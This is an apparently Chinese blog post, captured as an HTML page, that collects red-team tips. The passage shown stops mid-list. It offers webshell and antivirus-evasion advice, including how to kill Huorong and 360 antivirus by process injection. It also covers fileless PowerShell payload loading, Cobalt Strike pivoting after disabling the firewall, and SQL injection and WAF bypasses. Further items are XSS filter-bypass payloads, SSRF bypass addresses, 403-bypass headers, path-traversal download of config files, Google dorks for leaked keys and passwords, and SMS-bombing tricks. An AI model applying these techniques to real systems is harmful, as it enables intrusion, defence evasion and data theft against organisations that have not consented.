

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="由于是NET平台,可以先搜集以下所有相同系统的站点。然后扫一扫备份之类的。常见的字典如: web.rar 备份.rar 不能使用默认冰蝎和普通菜刀，去找一下面杀版的，蚁剑 behinderNessus（系统扫描与分析软件）Application.evtx文件—日志分析仿写，抄写脚本同类系统查询找漏洞遇到url的 forbidon 可以扫录试试御剑web指纹识别源码中可能有后台连接使用ipc连接域控">
<meta property="og:type" content="article">
<meta property="og:title" content="个人收集redteam重要tips(2000行 51898字符)">
<meta property="og:url" content="http://example.com/2023/01/12/%E4%B8%AA%E4%BA%BA%E6%94%B6%E9%9B%86redteam%E9%87%8D%E8%A6%81tips(2000%E8%A1%8C%2051898%E5%AD%97%E7%AC%A6)/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="由于是NET平台,可以先搜集以下所有相同系统的站点。然后扫一扫备份之类的。常见的字典如: web.rar 备份.rar 不能使用默认冰蝎和普通菜刀，去找一下面杀版的，蚁剑 behinderNessus（系统扫描与分析软件）Application.evtx文件—日志分析仿写，抄写脚本同类系统查询找漏洞遇到url的 forbidon 可以扫录试试御剑web指纹识别源码中可能有后台连接使用ipc连接域控">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="file:///C:/Users/e">
<meta property="og:image" content="g:/AppData/Roaming/Typora/typora-user-images/640.webp">
<meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640.webp">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415419.webp">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415422.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415802.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/640">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415769.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415676.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415850.jpeg">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161426063.jpeg">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161431794.jpeg">
<meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-16735232589041.jpeg">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161434828.jpeg">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204271707630.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204271707348.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292101238.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292101970.png">
<meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-16735232589052.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292105913.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292110187.jpeg">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292112762.jpeg">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292115305.jpeg">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051153095.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205142248705.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205151930560.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205151942329.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205202141969.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205251110342.jpeg">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205271632760.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205271633349.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206012249266.jpeg">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206171428502.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206171428300.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206171429692.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206251213913.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202207061204449.png">
<meta property="article:published_time" content="2023-01-11T16:00:00.000Z">
<meta property="article:modified_time" content="2023-02-20T10:30:10.000Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="tips">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="file:///C:/Users/e">
  
  
  
  <title>个人收集redteam重要tips(2000行 51898字符) - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="个人收集redteam重要tips(2000行 51898字符)"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-01-12 00:00" pubdate>
          January 12, 2023 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          46k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          380 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">个人收集redteam重要tips(2000行 51898字符)</h1>
            
            
              <div class="markdown-body">
                
                <p>由于是NET平台,可以先搜集以下所有相同系统的站点。然后扫一扫备份之类的。常见的字典如: web.rar 备份.rar</p>
<p>不能使用默认冰蝎和普通菜刀，去找一下面杀版的，蚁剑 behinder<br>Nessus（系统扫描与分析软件）<br>Application.evtx文件—日志分析<br>仿写，抄写脚本<br>同类系统查询找漏洞<br>遇到url的 forbidon 可以扫录试试<br>御剑web指纹识别<br>源码中可能有后台连接<br>使用ipc连接域控，注意这里需要用主机名而不能用ip<br>上传jsp的shell的话可以直接网页输入命令。<br>一般情况下往png后加个特殊字符能认为它是白名单不能进行绕过<br>反序列化的真正本质-类的调用过程-涉及java classloader（类加载器，利用java做框架的人普遍得学）<br>多学英语，国外漏洞都是英语</p>
<p>linux提权首选脏牛提权<br>高级mock是一种给服务器主机增加协议过滤ip等（通过脚本）的东西，那么也能够在高级mock中添加某种脚本文件来获取系统操作权限<br>定期刷漏洞库</p>
<p>在线力公系统的稿件是不能随意看到的,通常也是需要登录才能看到的。之所以在 hadkbar 能正常输入输出,是因为 Firefox 有 cooke .菜刀是没法填 cookie 的,需要到中国蚁刽,默认蚊剑也没有 cooke ,需要自己从浏览器复制进去所以大家在滲透的时候,遇到问题,可以换个浏览器访问看看,一个是因为 cooke 的问题,另外一个是目标站点对浏览器的适配可能有差别,导致看到的东西不一样,也是会影响到最终的渗透结果的。</p>
<p>fofa验证 docker 的两个小方法<br>ps -ef ：docker 一般显示很少的进程<br>ls -a &#x2F;.dockerenv</p>
<p>RCE(远程代码执行)：是互联网的一种安全漏洞。<br> SSRF(Server-Side Request Forgery, 服务端请求伪造)利用漏洞可以发起网络请求来攻击内网服务。<br>使用docker搭建靶场什么的比较好（docker是大佬对漏洞进行复现后写出来的docker文件，减少错误）</p>
<p>传txt 后html 后传hallo word 最后再传免杀</p>
<p>固定中间件端口 ip变化  遍历构造看下能不能ping出来</p>
<p>如果的能ping出来的再用工具找洞</p>
<p>作业16.了解XSS，SSRF，CSRF，XML注入，JSON注入等漏洞原理过程…..自己选一种漏洞写一篇专题总结文章，必须发表在freebuf，嘶吼，安全客，漏洞盒子 甚至看雪论坛等黑客主流媒体。（crlf）<br>LSB隐写题集</p>
<p>0x03 PowerShell内存执行exe</p>
<p>这也是现在红军非常流行的攻击手法，payload在内存中加载执行，也就是所谓的文件不落地，大致分以下几步<br>先将生成的payload在本地进行base64编码</p>
<p>靶机执行远程下载命令</p>
<p>靶机对payload进行解码并赋值给一个变量</p>
<p>PowerShell远程加载Invoke-ReflectivePEInjection模块（PE反射注入）并执行payload</p>
<p>火绒权限大于360权限大于安全狗 可以注入火绒然后再把360和安全狗杀了<br>但是比较难 不过可以注入360吧360自己和安全狗给杀了（还剩360主动防御）<br>taskkill杀火绒<br>注入回svchost.exe用它去杀死360的主动防御，这次杀死后就不会再生了<br>火绒的父进程是service.exe，可以注入到service.exe中，用service.exe杀Hips*.exe</p>
<p>分析找线索做表字典<br>进去后先截图既能留作证据又能用于后面隐藏</p>
<p>shell进去后可以systeminfo看下是什么服务器</p>
<p>打进去后截屏装载荷，添加信任</p>
<p>porttunnel 打进去后，将里面的windowsmicrosft防火墙关掉。然后再在肉鸡或者云服务器第一栏填肉鸡转发出去的ip加端口，第二栏写打进去的服务器的ip加端口。再在本地机用cs监听<br>cs可以配置两个端口，一个是打的服务器的 一个是肉鸡的。 还能配置多个云服务器装porttunnel进行转发</p>
<p><strong>15.access 扫出后缀为asp的数据库文件，访问乱码，</strong>如何实现到本地利用？</p>
<p>迅雷下载，直接改后缀为.mdb。</p>
<p>\提权时选择可读写目录，为何尽量不用带空格的目录？</p>
<p>因为exp执行多半需要空格界定参数</p>
<p>\某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</p>
<p>同数据库。</p>
<p>19:某个防注入系统，在注入时会提示：</p>
<p>系统检测到你有非法注入的行为。<br>已记录您的ip xx.xx.xx.xx<br>时间:2016:01-23<br>提交页面:test.asp?id&#x3D;15<br>提交内容:and 1&#x3D;1</p>
<p>20、如何利用这个防注入系统拿shell？</p>
<p>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。</p>
<p>上传大马后访问乱码时，有哪些解决办法？</p>
<p>浏览器中改编码。</p>
<p>目标站发现某txt的下载地址为<br><a target="_blank" rel="noopener" href="http://www.test.com/down/down.php?file=/upwdown/1.txt%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF%EF%BC%9F">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a></p>
<p>这就是传说中的下载漏洞！在file&#x3D;后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址</p>
<p>为什么aspx木马权限比asp大？</p>
<p>aspx使用的是.net技术。IIS 中默认不支持，ASP只是脚本语言而已。入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。</p>
<p>如果提示缺少参数，如{msg：params error}，可尝使用字典模糊测试构造参数，进一步攻击。</p>
<p>程序溢出，int最大值为2147483647，可尝试使用该值进行整数溢出，观察现象。</p>
<p>验证码简单绕过：重复使用，万能验证码（0000,8888），空验证码，验证码可识别（可用PKAV HTTP Fuzzer工具识别等）</p>
<p>短信轰炸绕过：手机号前加+86有可能会绕过，手机号输入邮箱，邮箱处输入手机号</p>
<p>SQL注入时，如果数据库是Mysql，可以尝试使用&amp;&amp;替换and，如：<code>&#39; &amp;&amp; &#39;1&#39;=&#39;1</code>，<code>&#39; %26%26 &#39;1&#39;=&#39;1</code>。</p>
<p>SQL注入时，如果数据库是Mysql，waf过滤了<code>=</code>，可尝试用<code>like</code>替代。如：<code>and 1 like 1</code></p>
<p>如果开放了redis服务（1234端口），可以尝试使用<code>/actuator/redis/info</code>语句看是否能读取敏感信息，如：<code>http://www.xxx.com:1234/actuator/redis/info</code></p>
<p>PI接口处，可以自己构造参数，POST形式传参，可以尝试构造为JSON格式，记得添加<code>content-type: application/json</code>，一些可尝试参数，page，size，id。</p>
<p>图片验证码可设置为空，如：code&#x3D;undefined</p>
<p>自动以验证码内容，观察Cookie中，参数中是否有发送给用户的内容，可以尝试更改，可以构造钓鱼链接。</p>
<p>在JS文件中搜索关键字<code>API</code>，<code>Swagger UI</code>等等，尝试寻找API接口地址。</p>
<p>信息收集，在搜狗搜索中选择<code>微信</code>可以搜索相关企业相关公众号资产</p>
<p>swagger接口常见路径：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/swagger/<br><span class="hljs-regexp">/api/swagger</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/swagger</span><span class="hljs-regexp">/ui/</span><br><span class="hljs-regexp">/api/swagger</span><span class="hljs-regexp">/ui/</span><br><span class="hljs-regexp">/swagger-ui.html/</span><br><span class="hljs-regexp">/api/swagger</span>-ui.html/<br><span class="hljs-regexp">/user/swagger</span>-ui.html/<br><span class="hljs-regexp">/swagger/ui</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/api</span><span class="hljs-regexp">/swagger/ui</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/libs</span><span class="hljs-regexp">/swaggerui/</span><br><span class="hljs-regexp">/api/swaggerui</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/swagger</span>-resources/configuration/ui/<br><span class="hljs-regexp">/swagger-resources/configuration</span><span class="hljs-regexp">/security/</span><br></code></pre></td></tr></table></figure>

<p>swagger组件特征固定title：<code>Swagger UI</code></p>
<p>如果遇见后台页面一闪而过，接着让你登录，一般使用了权限认证方式，可以用一下方式进行绕过，或者遇见401,403,302，都可以尝试使用以下方法：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">一、GET <span class="hljs-regexp">/xxx HTTP/</span><span class="hljs-number">1.1</span> à<span class="hljs-number">403</span><br>Host: test.com<br>绕过：<br>GET <span class="hljs-regexp">/xxx HTTP/</span><span class="hljs-number">1.1</span> à<span class="hljs-number">200</span><br>Host: test.com<br>X-Original-URL: /xxx<br><br>二、GET <span class="hljs-regexp">/xxx HTTP/</span><span class="hljs-number">1.1</span> à<span class="hljs-number">403</span><br>Host: test.com<br>绕过：<br>GET <span class="hljs-regexp">/xxx HTTP/</span><span class="hljs-number">1.1</span> à<span class="hljs-number">200</span><br>Host: test.com<br>Referer: http:<span class="hljs-regexp">//</span>test.com/xxx<br><br>三、<span class="hljs-number">302</span>跳转：拦截并drop跳转的数据包，使其停留在当前页面。<br>四、前端验证：只需要删掉对应的遮挡模块，或者是验证模块的前端代码。<br></code></pre></td></tr></table></figure>

<p>一款生成gopher协议payload的工具：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/firebroo/</span>sec_tools<br></code></pre></td></tr></table></figure>

<p>XSS过滤了单引号，等号可以：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">①、使用：String<span class="hljs-selector-class">.fromCharCode</span>(<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>);<br>为<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)，该方法输出的结果为字符串，可以使用<span class="hljs-built_in">eval</span>()进行执行，即弹框操作<br><span class="hljs-built_in">eval</span>(String.fromCharCode(<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>));<br>②、atob函数：<br><span class="hljs-built_in">eval</span>(atob`YWxlcnQoMSk=`) 为 <span class="hljs-built_in">eval</span>(atob`alert(<span class="hljs-number">1</span>)`) 其中`为反引号<br></code></pre></td></tr></table></figure>

<p>XSS过滤了单引号，等号以及圆括号，eval：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">①、过滤了<span class="hljs-built_in">eval</span>函数可以用其他函数去绕过，如：<span class="hljs-title class_">Function</span>，constructor<br><span class="hljs-title class_">Function</span><span class="hljs-string">`a<span class="hljs-subst">$&#123;atob<span class="hljs-string">`YWxlcnQoMSk=`</span>&#125;</span>`</span><span class="hljs-string">``</span><br><span class="hljs-string">``</span>.<span class="hljs-property">constructor</span>.<span class="hljs-property">constructor</span><span class="hljs-string">`a<span class="hljs-subst">$&#123;atob<span class="hljs-string">`YWxlcnQoMSk=`</span>&#125;</span>`</span><span class="hljs-string">``</span><br></code></pre></td></tr></table></figure>

<p>可使用下面命令查看是否处在docker虚拟机中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure>

<p>万能密码试试<code>&#39;=0#</code></p>
<p>36、CORS漏洞验证，可以使用curl来验证：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl https:<span class="hljs-regexp">//</span>www.xxxx.com -H <span class="hljs-string">&quot;Origin: https://test.com&quot;</span> -I<br>检查返回包的 Access-Control-Allow-Origin 字段是否为https:<span class="hljs-regexp">//</span>test.com<br></code></pre></td></tr></table></figure>

<p>37、在盲测目标系统是否为Shiro时，可以在Cookie中手动构造<code>rememebrMe=xxx</code>，如果返回包中Set-Cookie中存在<code>rememberMe=deleteMe</code>，则证明该系统使用了Shiro，因此可以进一步攻击。<br>38、使用正则获取网站中所包含的其他URL：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> <span class="hljs-keyword">file</span> | <span class="hljs-keyword">grep</span> -Eo <span class="hljs-string">&quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;</span>*<br><br>curl http://host.xx/<span class="hljs-keyword">file</span>.js | <span class="hljs-keyword">grep</span> -Eo <span class="hljs-string">&quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;</span>*<br></code></pre></td></tr></table></figure>

<p>39、常见的一些远程命令执行（RCE）参数，详情，请看dicts目录下的RCE-extentions.txt文件。</p>
<p>40、绕过SSRF防护的几个小方法：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">A、绕过SSRF限制通过CIDR，如：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.127</span>.<span class="hljs-number">127.127</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span><br><br>B、不完整的地址，如：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span><br><br>C、将地址结合在通过特殊字符结合在一起，如：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span> &amp;@<span class="hljs-number">2.2</span>.<span class="hljs-number">2.2</span><span class="hljs-comment"># @3.3.3.3/</span><br>urllib : <span class="hljs-number">3.3</span>.<span class="hljs-number">3.3</span><br><br>D、绕过解析器，如：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span>.<span class="hljs-number">1.1</span>:<span class="hljs-number">80</span>\@<span class="hljs-number">127.2</span>.<span class="hljs-number">2.2</span>:<span class="hljs-number">80</span>/<br><br>E、绕过localhost通过[::]，如：<br>http:<span class="hljs-regexp">//</span>[::]:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0000</span>::<span class="hljs-number">1</span>:<span class="hljs-number">80</span>/<br><br></code></pre></td></tr></table></figure>

<p>41、几个常用的Google语法：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">inur<span class="hljs-variable">l:example</span>.<span class="hljs-keyword">com</span> intitle:<span class="hljs-string">&quot;index of&quot;</span><br>inur<span class="hljs-variable">l:example</span>.<span class="hljs-keyword">com</span> intitle:<span class="hljs-string">&quot;index of /&quot;</span> <span class="hljs-string">&quot;*key.pem&quot;</span><br>inur<span class="hljs-variable">l:example</span>.<span class="hljs-keyword">com</span> <span class="hljs-keyword">ex</span><span class="hljs-variable">t:log</span><br>inur<span class="hljs-variable">l:example</span>.<span class="hljs-keyword">com</span> intitle:<span class="hljs-string">&quot;index of&quot;</span> <span class="hljs-keyword">ex</span><span class="hljs-variable">t:sql</span>|xls|xml|json|csv<br>inur<span class="hljs-variable">l:example</span>.<span class="hljs-keyword">com</span> <span class="hljs-string">&quot;MYSQL_ROOT_PASSWORD:&quot;</span> <span class="hljs-keyword">ex</span><span class="hljs-variable">t:env</span> OR <span class="hljs-keyword">ex</span><span class="hljs-variable">t:yml</span> -git<br></code></pre></td></tr></table></figure>

<p>42、通过favicon的hash来对比相关联的两个网站：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">脚本地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/m4ll0k/</span>Bug-Bounty-Toolz<span class="hljs-regexp">/blob/m</span>aster/favihash.py<br>命令：python3 favihash.py -f https:<span class="hljs-regexp">//</span>target/favicon.ico -t targets.txt -s<br></code></pre></td></tr></table></figure>

<p>43、一些本地包含参数，详情请看dicts目录下的LFI-extentions.txt文件。</p>
<p>44、在JavaScript文件中可以找一些隐藏的GET参数，比如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">首先，在js文件中找到一些变量，比如：var <span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;xss&quot;</span><br>然后，可以尝试使用GET方法构造每一个参数，比如：<br>https://example.com/?<span class="hljs-built_in">test</span>=”xsstest<br>本方法可能会发现一些XSS<br></code></pre></td></tr></table></figure>

<p>45、使用github dorks帮助我们寻找一些敏感信息，比如：</p>
